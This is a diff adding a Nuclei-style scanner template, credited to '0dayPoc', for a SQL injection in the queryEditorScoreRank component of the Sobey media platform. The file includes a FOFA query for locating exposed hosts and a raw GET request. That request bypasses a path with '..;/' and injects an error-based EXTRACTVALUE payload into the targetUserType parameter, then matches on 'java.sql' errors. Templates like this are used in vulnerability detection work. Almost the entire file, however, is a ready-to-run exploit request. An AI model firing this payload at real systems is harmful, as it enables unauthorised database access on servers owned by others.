@@ -1,0 +1,25 @@
+id: sobey-media-queryeditorscorerank-sqli
+
+info:
+  name: "索贝融媒体工作平台 queryEditorScoreRank 组件 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: header="Sobey" || body="/Sc-TaskMonitoring/"
+          通过构造恶意SQL语句，攻击者可实现对数据库查询的非授权操控，导致任意SQL命令执行。
+  tags: 索贝融媒体工作平台
+
+http:
+- raw:
+  - |
+    GET /sobey-mchEditor/js/..;/mch/jztEditorScore/queryEditorScoreRank?siteCode=&targetUserType='+AND+EXTRACTVALUE(6654,CONCAT(0x7e,d52780ff1221874050cfc27cbb17c8d7,0x7e))+AND+'1'='1&token=&userCode=admin HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'java.sql'
